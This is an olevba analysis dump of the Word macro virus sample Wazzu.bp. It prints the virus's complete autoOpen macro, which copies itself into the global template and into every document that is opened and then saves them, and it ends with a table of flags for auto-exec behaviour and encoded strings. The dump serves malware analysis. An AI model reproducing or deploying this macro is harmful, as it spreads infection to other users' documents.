olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.bp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.bp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu.bp - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Leaving Traces of Wazzu Around the World..."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
Dim FileMacro$
Dim GlobalMacro$

On Error GoTo -1: On Error GoTo Sucker

    FileMacro$ = WordBasic.[FileName$]() + ":autoOpen"
    GlobalMacro$ = "Global:autoOpen"

    If WordBasic.[MacroFileName$]() = WordBasic.[FileName$]() Then
        WordBasic.MacroCopy FileMacro$, GlobalMacro$, 1
    Else
        WordBasic.MacroCopy GlobalMacro$, FileMacro$, 1
        WordBasic.FileSaveAs Format:=1
    End If

    If Rnd() < 0.15 Then
        WordBasic.MsgBox "Leaving Traces of Wazzu Around the World..."
    End If

Sucker:

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Wazzu.bp - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

